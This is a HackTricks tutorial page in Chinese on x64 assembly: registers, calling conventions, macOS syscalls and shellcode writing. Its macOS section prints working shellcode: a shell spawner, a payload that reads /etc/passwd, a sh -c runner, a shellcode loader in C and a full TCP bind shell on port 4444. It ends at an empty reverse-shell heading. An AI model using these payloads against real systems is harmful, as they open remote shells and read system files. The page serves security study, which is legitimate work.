<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Introduction to x64</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="introduction-to-x64"><a class="header" href="#introduction-to-x64">Introduction to x64</a></h1>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}
<h2 id="introduction-to-x64-1"><a class="header" href="#introduction-to-x64-1"><strong>Introduction to x64</strong></a></h2>
<p>x64ï¼Œä¹Ÿç§°ä¸º x86-64ï¼Œæ˜¯ä¸€ç§ä¸»è¦ç”¨äºæ¡Œé¢å’ŒæœåŠ¡å™¨è®¡ç®—çš„ 64 ä½å¤„ç†å™¨æ¶æ„ã€‚å®ƒèµ·æºäº Intel ç”Ÿäº§çš„ x86 æ¶æ„ï¼Œåæ¥è¢« AMD é‡‡ç”¨å¹¶å‘½åä¸º AMD64ï¼Œç°ä»Šæ˜¯ä¸ªäººè®¡ç®—æœºå’ŒæœåŠ¡å™¨ä¸­æ™®éä½¿ç”¨çš„æ¶æ„ã€‚</p>
<h3 id="registers"><a class="header" href="#registers"><strong>Registers</strong></a></h3>
<p>x64 åœ¨ x86 æ¶æ„çš„åŸºç¡€ä¸Šæ‰©å±•ï¼Œå…·æœ‰ <strong>16 ä¸ªé€šç”¨å¯„å­˜å™¨</strong>ï¼Œæ ‡è®°ä¸º <code>rax</code>ã€<code>rbx</code>ã€<code>rcx</code>ã€<code>rdx</code>ã€<code>rbp</code>ã€<code>rsp</code>ã€<code>rsi</code>ã€<code>rdi</code>ï¼Œä»¥åŠ <code>r8</code> åˆ° <code>r15</code>ã€‚æ¯ä¸ªå¯„å­˜å™¨å¯ä»¥å­˜å‚¨ä¸€ä¸ª <strong>64 ä½</strong>ï¼ˆ8 å­—èŠ‚ï¼‰å€¼ã€‚è¿™äº›å¯„å­˜å™¨è¿˜å…·æœ‰ 32 ä½ã€16 ä½å’Œ 8 ä½çš„å­å¯„å­˜å™¨ï¼Œä»¥ä¾¿äºå…¼å®¹æ€§å’Œç‰¹å®šä»»åŠ¡ã€‚</p>
<ol>
<li><strong><code>rax</code></strong> - ä¼ ç»Ÿä¸Šç”¨äº <strong>å‡½æ•°çš„è¿”å›å€¼</strong>ã€‚</li>
<li><strong><code>rbx</code></strong> - é€šå¸¸ç”¨ä½œå†…å­˜æ“ä½œçš„ <strong>åŸºå€å¯„å­˜å™¨</strong>ã€‚</li>
<li><strong><code>rcx</code></strong> - å¸¸ç”¨äº <strong>å¾ªç¯è®¡æ•°å™¨</strong>ã€‚</li>
<li><strong><code>rdx</code></strong> - åœ¨å„ç§è§’è‰²ä¸­ä½¿ç”¨ï¼ŒåŒ…æ‹¬æ‰©å±•ç®—æœ¯æ“ä½œã€‚</li>
<li><strong><code>rbp</code></strong> - å †æ ˆå¸§çš„ <strong>åŸºæŒ‡é’ˆ</strong>ã€‚</li>
<li><strong><code>rsp</code></strong> - <strong>æ ˆæŒ‡é’ˆ</strong>ï¼Œè·Ÿè¸ªæ ˆé¡¶ã€‚</li>
<li><strong><code>rsi</code></strong> å’Œ <strong><code>rdi</code></strong> - ç”¨äºå­—ç¬¦ä¸²/å†…å­˜æ“ä½œä¸­çš„ <strong>æº</strong> å’Œ <strong>ç›®æ ‡</strong> ç´¢å¼•ã€‚</li>
<li><strong><code>r8</code></strong> åˆ° <strong><code>r15</code></strong> - åœ¨ x64 ä¸­å¼•å…¥çš„é¢å¤–é€šç”¨å¯„å­˜å™¨ã€‚</li>
</ol>
<h3 id="calling-convention"><a class="header" href="#calling-convention"><strong>Calling Convention</strong></a></h3>
<p>x64 çš„è°ƒç”¨çº¦å®šåœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´æœ‰æ‰€ä¸åŒã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>Windows</strong>ï¼šå‰ <strong>å››ä¸ªå‚æ•°</strong> é€šè¿‡å¯„å­˜å™¨ <strong><code>rcx</code></strong>ã€<strong><code>rdx</code></strong>ã€<strong><code>r8</code></strong> å’Œ <strong><code>r9</code></strong> ä¼ é€’ã€‚è¿›ä¸€æ­¥çš„å‚æ•°è¢«æ¨å…¥æ ˆä¸­ã€‚è¿”å›å€¼åœ¨ <strong><code>rax</code></strong> ä¸­ã€‚</li>
<li><strong>System Vï¼ˆé€šå¸¸ç”¨äºç±» UNIX ç³»ç»Ÿï¼‰</strong>ï¼šå‰ <strong>å…­ä¸ªæ•´æ•°æˆ–æŒ‡é’ˆå‚æ•°</strong> é€šè¿‡å¯„å­˜å™¨ <strong><code>rdi</code></strong>ã€<strong><code>rsi</code></strong>ã€<strong><code>rdx</code></strong>ã€<strong><code>rcx</code></strong>ã€<strong><code>r8</code></strong> å’Œ <strong><code>r9</code></strong> ä¼ é€’ã€‚è¿”å›å€¼ä¹Ÿåœ¨ <strong><code>rax</code></strong> ä¸­ã€‚</li>
</ul>
<p>å¦‚æœå‡½æ•°æœ‰è¶…è¿‡å…­ä¸ªè¾“å…¥ï¼Œ<strong>å…¶ä½™å‚æ•°å°†é€šè¿‡æ ˆä¼ é€’</strong>ã€‚<strong>RSP</strong>ï¼Œæ ˆæŒ‡é’ˆï¼Œå¿…é¡» <strong>16 å­—èŠ‚å¯¹é½</strong>ï¼Œè¿™æ„å‘³ç€å®ƒæŒ‡å‘çš„åœ°å€åœ¨ä»»ä½•è°ƒç”¨å‘ç”Ÿä¹‹å‰å¿…é¡»èƒ½è¢« 16 æ•´é™¤ã€‚è¿™æ„å‘³ç€é€šå¸¸æˆ‘ä»¬éœ€è¦ç¡®ä¿åœ¨è¿›è¡Œå‡½æ•°è°ƒç”¨ä¹‹å‰ï¼ŒRSP åœ¨æˆ‘ä»¬çš„ shellcode ä¸­æ˜¯æ­£ç¡®å¯¹é½çš„ã€‚ç„¶è€Œï¼Œåœ¨å®è·µä¸­ï¼Œå³ä½¿ä¸æ»¡è¶³æ­¤è¦æ±‚ï¼Œç³»ç»Ÿè°ƒç”¨é€šå¸¸ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œã€‚</p>
<h3 id="calling-convention-in-swift"><a class="header" href="#calling-convention-in-swift">Calling Convention in Swift</a></h3>
<p>Swift æœ‰å…¶è‡ªå·±çš„ <strong>è°ƒç”¨çº¦å®š</strong>ï¼Œå¯ä»¥åœ¨ <a href="https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64"><strong>https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64</strong></a> ä¸­æ‰¾åˆ°ã€‚</p>
<h3 id="common-instructions"><a class="header" href="#common-instructions"><strong>Common Instructions</strong></a></h3>
<p>x64 æŒ‡ä»¤é›†ä¸°å¯Œï¼Œä¿æŒä¸æ—©æœŸ x86 æŒ‡ä»¤çš„å…¼å®¹æ€§ï¼Œå¹¶å¼•å…¥äº†æ–°çš„æŒ‡ä»¤ã€‚</p>
<ul>
<li><strong><code>mov</code></strong>ï¼š<strong>ç§»åŠ¨</strong>ä¸€ä¸ªå€¼ä»ä¸€ä¸ª <strong>å¯„å­˜å™¨</strong> æˆ– <strong>å†…å­˜ä½ç½®</strong> åˆ°å¦ä¸€ä¸ªã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>mov rax, rbx</code> â€” å°† <code>rbx</code> çš„å€¼ç§»åŠ¨åˆ° <code>rax</code>ã€‚</li>
<li><strong><code>push</code></strong> å’Œ <strong><code>pop</code></strong>ï¼šå°†å€¼æ¨å…¥æˆ–å¼¹å‡º <strong>æ ˆ</strong>ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>push rax</code> â€” å°† <code>rax</code> ä¸­çš„å€¼æ¨å…¥æ ˆä¸­ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>pop rax</code> â€” å°†æ ˆé¡¶çš„å€¼å¼¹å‡ºåˆ° <code>rax</code> ä¸­ã€‚</li>
<li><strong><code>add</code></strong> å’Œ <strong><code>sub</code></strong>ï¼š<strong>åŠ æ³•</strong>å’Œ <strong>å‡æ³•</strong> æ“ä½œã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>add rax, rcx</code> â€” å°† <code>rax</code> å’Œ <code>rcx</code> ä¸­çš„å€¼ç›¸åŠ ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ <code>rax</code> ä¸­ã€‚</li>
<li><strong><code>mul</code></strong> å’Œ <strong><code>div</code></strong>ï¼š<strong>ä¹˜æ³•</strong>å’Œ <strong>é™¤æ³•</strong> æ“ä½œã€‚æ³¨æ„ï¼šè¿™äº›æŒ‡ä»¤åœ¨æ“ä½œæ•°ä½¿ç”¨æ–¹é¢æœ‰ç‰¹å®šè¡Œä¸ºã€‚</li>
<li><strong><code>call</code></strong> å’Œ <strong><code>ret</code></strong>ï¼šç”¨äº <strong>è°ƒç”¨</strong> å’Œ <strong>ä»å‡½æ•°è¿”å›</strong>ã€‚</li>
<li><strong><code>int</code></strong>ï¼šç”¨äºè§¦å‘è½¯ä»¶ <strong>ä¸­æ–­</strong>ã€‚ä¾‹å¦‚ï¼Œ<code>int 0x80</code> ç”¨äº 32 ä½ x86 Linux çš„ç³»ç»Ÿè°ƒç”¨ã€‚</li>
<li><strong><code>cmp</code></strong>ï¼š<strong>æ¯”è¾ƒ</strong>ä¸¤ä¸ªå€¼ï¼Œå¹¶æ ¹æ®ç»“æœè®¾ç½® CPU çš„æ ‡å¿—ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>cmp rax, rdx</code> â€” å°† <code>rax</code> ä¸ <code>rdx</code> è¿›è¡Œæ¯”è¾ƒã€‚</li>
<li><strong><code>je</code>ã€<code>jne</code>ã€<code>jl</code>ã€<code>jge</code>ã€...</strong>ï¼š<strong>æ¡ä»¶è·³è½¬</strong>æŒ‡ä»¤ï¼Œæ ¹æ®å…ˆå‰çš„ <code>cmp</code> æˆ–æµ‹è¯•ç»“æœæ”¹å˜æ§åˆ¶æµã€‚</li>
<li>ç¤ºä¾‹ï¼šåœ¨ <code>cmp rax, rdx</code> æŒ‡ä»¤ä¹‹åï¼Œ<code>je label</code> â€” å¦‚æœ <code>rax</code> ç­‰äº <code>rdx</code>ï¼Œåˆ™è·³è½¬åˆ° <code>label</code>ã€‚</li>
<li><strong><code>syscall</code></strong>ï¼šåœ¨æŸäº› x64 ç³»ç»Ÿï¼ˆå¦‚ç°ä»£ Unixï¼‰ä¸­ç”¨äº <strong>ç³»ç»Ÿè°ƒç”¨</strong>ã€‚</li>
<li><strong><code>sysenter</code></strong>ï¼šåœ¨æŸäº›å¹³å°ä¸Šçš„ä¼˜åŒ– <strong>ç³»ç»Ÿè°ƒç”¨</strong> æŒ‡ä»¤ã€‚</li>
</ul>
<h3 id="function-prologue"><a class="header" href="#function-prologue"><strong>Function Prologue</strong></a></h3>
<ol>
<li><strong>æ¨é€æ—§çš„åŸºæŒ‡é’ˆ</strong>ï¼š<code>push rbp</code>ï¼ˆä¿å­˜è°ƒç”¨è€…çš„åŸºæŒ‡é’ˆï¼‰</li>
<li><strong>å°†å½“å‰æ ˆæŒ‡é’ˆç§»åŠ¨åˆ°åŸºæŒ‡é’ˆ</strong>ï¼š<code>mov rbp, rsp</code>ï¼ˆä¸ºå½“å‰å‡½æ•°è®¾ç½®æ–°çš„åŸºæŒ‡é’ˆï¼‰</li>
<li><strong>åœ¨æ ˆä¸Šä¸ºå±€éƒ¨å˜é‡åˆ†é…ç©ºé—´</strong>ï¼š<code>sub rsp, &lt;size&gt;</code>ï¼ˆå…¶ä¸­ <code>&lt;size&gt;</code> æ˜¯æ‰€éœ€çš„å­—èŠ‚æ•°ï¼‰</li>
</ol>
<h3 id="function-epilogue"><a class="header" href="#function-epilogue"><strong>Function Epilogue</strong></a></h3>
<ol>
<li><strong>å°†å½“å‰åŸºæŒ‡é’ˆç§»åŠ¨åˆ°æ ˆæŒ‡é’ˆ</strong>ï¼š<code>mov rsp, rbp</code>ï¼ˆé‡Šæ”¾å±€éƒ¨å˜é‡ï¼‰</li>
<li><strong>ä»æ ˆä¸­å¼¹å‡ºæ—§çš„åŸºæŒ‡é’ˆ</strong>ï¼š<code>pop rbp</code>ï¼ˆæ¢å¤è°ƒç”¨è€…çš„åŸºæŒ‡é’ˆï¼‰</li>
<li><strong>è¿”å›</strong>ï¼š<code>ret</code>ï¼ˆå°†æ§åˆ¶æƒè¿”å›ç»™è°ƒç”¨è€…ï¼‰</li>
</ol>
<h2 id="macos"><a class="header" href="#macos">macOS</a></h2>
<h3 id="syscalls"><a class="header" href="#syscalls">syscalls</a></h3>
<p>æœ‰ä¸åŒç±»åˆ«çš„ syscallsï¼Œæ‚¨å¯ä»¥ <a href="https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h"><strong>åœ¨è¿™é‡Œæ‰¾åˆ°å®ƒä»¬</strong></a><strong>:</strong></p>
<pre><code class="language-c">#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
</code></pre>
<p>ç„¶åï¼Œæ‚¨å¯ä»¥åœ¨<a href="https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master"><strong>æ­¤ç½‘å€</strong></a><strong>ä¸­æ‰¾åˆ°æ¯ä¸ªç³»ç»Ÿè°ƒç”¨å·ï¼š</strong></p>
<pre><code class="language-c">0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
</code></pre>
<p>å› æ­¤ï¼Œä¸ºäº†ä» <strong>Unix/BSD ç±»</strong> è°ƒç”¨ <code>open</code> ç³»ç»Ÿè°ƒç”¨ (<strong>5</strong>)ï¼Œæ‚¨éœ€è¦æ·»åŠ å®ƒï¼š<code>0x2000000</code></p>
<p>å› æ­¤ï¼Œè°ƒç”¨ open çš„ç³»ç»Ÿè°ƒç”¨ç¼–å·å°†æ˜¯ <code>0x2000005</code></p>
<h3 id="shellcodes"><a class="header" href="#shellcodes">Shellcodes</a></h3>
<p>è¦ç¼–è¯‘ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
</code></pre>
<p>{% endcode %}</p>
<p>æå–å­—èŠ‚ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
</code></pre>
<p>{% endcode %}</p>
<details>
<summary>æµ‹è¯• shellcode çš„ C ä»£ç </summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
<p>int (*sc)();</p>
<p>char shellcode[] = "<INSERT SHELLCODE HERE>";</p>
<p>int main(int argc, char **argv) {
printf("[&gt;] Shellcode Length: %zd Bytes\n", strlen(shellcode));</p>
<p>void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);</p>
<p>if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-&gt; Return = %p\n", ptr);</p>
<p>void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-&gt; Return = %p\n", dst);</p>
<p>int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);</p>
<p>if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-&gt; Return = %d\n", status);</p>
<p>printf("[&gt;] Trying to execute shellcode...\n");</p>
<p>sc = ptr;
sc();</p>
<p>return 0;
}</p>
<pre><code>&lt;/details&gt;

#### Shell

å–è‡ª[**è¿™é‡Œ**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)å¹¶è¿›è¡Œäº†è§£é‡Šã€‚

{% tabs %}
{% tab title="with adr" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
</code></pre>
<p>{% endtab %}</p>
<p>{% tab title="å¸¦å †æ ˆ" %}</p>
<pre><code class="language-armasm">bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h4 id="ä½¿ç”¨-cat-è¯»å–"><a class="header" href="#ä½¿ç”¨-cat-è¯»å–">ä½¿ç”¨ cat è¯»å–</a></h4>
<p>ç›®æ ‡æ˜¯æ‰§è¡Œ <code>execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)</code>ï¼Œå› æ­¤ç¬¬äºŒä¸ªå‚æ•° (x1) æ˜¯ä¸€ä¸ªå‚æ•°æ•°ç»„ï¼ˆåœ¨å†…å­˜ä¸­ï¼Œè¿™æ„å‘³ç€ä¸€å †åœ°å€ï¼‰ã€‚</p>
<pre><code class="language-armasm">bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
</code></pre>
<h4 id="ä½¿ç”¨-sh-è°ƒç”¨å‘½ä»¤"><a class="header" href="#ä½¿ç”¨-sh-è°ƒç”¨å‘½ä»¤">ä½¿ç”¨ sh è°ƒç”¨å‘½ä»¤</a></h4>
<pre><code class="language-armasm">bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &amp;"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &amp;"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &amp;"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
</code></pre>
<h4 id="bind-shell"><a class="header" href="#bind-shell">Bind shell</a></h4>
<p>æ¥è‡ª <a href="https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html">https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html</a> çš„ Bind shell åœ¨ <strong>port 4444</strong></p>
<pre><code class="language-armasm">section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &amp;sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -&gt; dup2(client_sockid, 1)
;   -&gt; dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
</code></pre>
<h4 id="åå‘shell"><a class="header" href="#åå‘shell">åå‘Shell</a></h4>
